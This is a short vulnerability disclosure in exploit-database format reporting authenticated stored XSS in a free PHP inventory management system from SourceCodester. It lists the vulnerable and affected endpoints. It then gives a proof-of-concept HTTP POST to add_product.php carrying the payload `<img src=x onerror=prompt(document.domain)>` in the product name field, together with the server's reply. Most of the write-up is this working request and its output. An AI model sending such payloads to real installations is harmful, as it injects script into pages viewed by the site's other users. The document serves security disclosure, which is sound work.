
**Exploit Title:** Free and Open Source inventory management system php - Multiple Stored XSS  <br>
**Date**: 4/08/2023 <br>
**Exploit Author:** y3thu <br>
**Vendor Homepage:** https://www.sourcecodester.com/users/mayurik <br>
**Software Link:** https://www.sourcecodester.com/php/16741/free-and-open-source-inventory-management-system-php-source-code.html <br>
**Attack Vector:** WEB, Network <br>
**Testeted on:** Windows 10  using XAMPP <br>

**Authenticated stored XSS** <br>
**Vulnerable Endpoints:** `/index.php?page=add_expense ,/index.php?page=add_product,/index.php?page=add_stuff, ...` <br>
**Affected endpoints:** `/index.php?page=sell_list,/index.php?page=buy_list,/index.php?page=product_list,/index.php?page=exspense_list,/index.php?page=staff_list,/index.php?page=dashboard,/index.php?page=category` <br>
![image](https://github.com/yethu123/XSS-and-SQL-Injection-on-Free-and-Open-Source-inventory-management-system/assets/29069905/3e20f2be-5083-4e59-9530-7ae4b4f7dcfc) <br>

**POC**

    POST /ample/app/action/add_product.php HTTP/1.1
    Host: localhost
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
    Accept: */*
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    X-Requested-With: XMLHttpRequest
    Content-Length: 132
    Origin: http://localhost
    Connection: close
    Referer: http://localhost/ample/index.php?page=add_product
    Cookie: PHPSESSID=g11ukg4bi8dvr9q9uqvsslpm3t
    Sec-Fetch-Dest: empty
    Sec-Fetch-Mode: cors
    Sec-Fetch-Site: same-origin
    
    product_name=%3Cimg+src%3Dx+onerror%3Dprompt(document.domain)%3E&brand=test&p_catagory=2&product_source=buy&sku=aaa&alert_quantity=3


Response

    HTTP/1.1 200 OK
    Date: Fri, 04 Aug 2023 08:52:04 GMT
    Server: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/7.4.30
    X-Powered-By: PHP/7.4.30
    Expires: Thu, 19 Nov 1981 08:52:00 GMT
    Cache-Control: no-store, no-cache, must-revalidate
    Pragma: no-cache
    Content-Length: 3
    Connection: close
    Content-Type: text/html; charset=UTF-8
    
    yes

![image](https://github.com/yethu123/XSS-and-SQL-Injection-on-Free-and-Open-Source-inventory-management-system/assets/29069905/a583971a-9c90-4caf-aeb9-b96c4189996d)
